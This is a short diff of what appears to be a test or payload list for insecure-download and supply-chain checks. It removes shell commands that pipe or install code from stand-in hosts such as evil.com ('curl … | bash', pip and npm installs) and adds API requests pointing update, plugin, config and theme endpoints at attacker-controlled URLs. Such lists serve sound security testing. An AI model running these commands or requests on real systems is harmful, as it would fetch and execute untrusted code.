@@ -1,4 +1,8 @@
-curl http://evil.com/script.sh | bash
-wget http://update.server/pkg.tar.gz (no checksum)
-pip install --index-url http://evil.com package
-npm install http://evil.com/package.tgz
+POST /api/update {"url":"http://attacker.com/update.pkg"}
+POST /api/plugin/install {"source":"http://untrusted.com/plugin.zip"}
+PUT /api/config {"cdn":"http://evil.com/libs/"}
+POST /api/import {"feed":"http://attacker.com/feed.xml"}
+POST /api/theme {"url":"http://evil.com/theme.zip"}
+POST /api/extension {"download":"http://attacker.com/ext.tar.gz"}
+PUT /api/settings {"update_server":"http://attacker.com"}
+GET /api/update/download?source=http://evil.com/pkg.tar.gz
